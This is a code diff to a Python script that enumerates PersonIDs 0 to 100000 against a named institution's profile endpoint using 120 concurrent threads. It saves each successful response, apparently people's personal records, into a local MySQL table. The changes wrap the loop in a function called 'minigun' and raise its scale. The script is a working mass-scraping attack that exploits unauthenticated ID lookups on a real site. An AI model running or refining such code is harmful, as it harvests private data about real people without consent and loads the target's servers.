@@ -85,6 +85,7 @@ mycursor = mydb.cursor()
 
 def add_user(unified_id, rollno, name):
 
+    print(f"ADDING USER {rollno} {unified_id} {name}")
     add_user_query = """
     INSERT INTO users (UNIFIED_ID, ROLLNO, NAME) values (%s, %s,%s)
     """
@@ -96,13 +97,10 @@ def add_user(unified_id, rollno, name):
         print(f"Error adding user {user_data}", e)
 
 
-URL = 'http://rajalakshmi.in/UI/Modules/Profile/Profile.aspx/GetPersonInfo'
-payloads = []
-
-
 def make_request(payload):
     person_id = payload['PersonID']
     timeout = 10
+    URL = 'http://rajalakshmi.in/UI/Modules/Profile/Profile.aspx/GetPersonInfo'
     try:
         response = requests.post(
             URL,
@@ -121,24 +119,21 @@ def make_request(payload):
         return person_id, response.status_code, f"Request Exception: {err}"
 
 
-if __name__ == "__main__":
+def minigun():
 
     list_of_users = []
-    # create_database()
-    # delete_user_table()
-    # create_user_table()
-
-    # for i in range(0, 50000):
-    for i in range(0, 80000):
+    payloads = []
+    for i in range(0, 100000):
         payloads.append(
             {
                 'PersonID': i
             }
         )
-    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=120) as executor:
         futures = {
             executor.submit(make_request, payload):
-            payload for payload in payloads}
+            payload for payload in payloads
+        }
 
         count = 0
         total_count = 0
@@ -148,15 +143,15 @@ if __name__ == "__main__":
                 person_id, status_code, response = future.result()
                 if status_code == 200:
                     list_of_users.append((person_id, response))
-                    print("| Added users: ", count,
-                          "| total tries:", total_count, "|")
+                    print("| FOUND USER: ", count,
+                          "| TOTAL TRIES:", total_count, "|")
                     count += 1
 
             except Exception as e:
                 print(
-                    f"|PersonID: {person_id}\
-                    | Payload: {payload}\
-                    | Exception occurred: {e}|")
+                    f"|PersonID: {person_id} \
+                    | Payload: {payload} \
+                    | Exception occurred: {e} |")
 
             total_count += 1
 
@@ -187,3 +182,12 @@ if __name__ == "__main__":
 
     mydb.commit()
     mydb.close()
+
+
+if __name__ == "__main__":
+
+    # create_database()
+    # delete_user_table()
+    # create_user_table()
+
+    minigun()
